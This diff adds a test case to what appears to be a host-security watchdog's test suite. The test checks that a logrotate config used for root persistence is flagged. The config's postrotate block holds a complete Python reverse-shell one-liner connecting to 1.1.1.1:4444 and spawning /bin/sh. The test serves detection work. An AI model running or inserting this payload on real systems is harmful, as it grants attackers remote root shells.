@@ -350,3 +350,27 @@ EOF
         bash "${WD}"
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on logrotate postrotate surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the logrotate-
+    # rotation-trigger root-exec persistence surface (T1546 —
+    # logrotate runs postrotate scripts AS ROOT on every rotation
+    # cycle — recurring trigger fired by daily/weekly/monthly
+    # operator-routine maintenance).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${CONF}" <<'EOF'
+/var/log/app.log {
+  daily
+  postrotate
+    python -c "import socket,os,pty;s=socket.socket();s.connect(('1.1.1.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')"
+  endscript
+}
+EOF
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
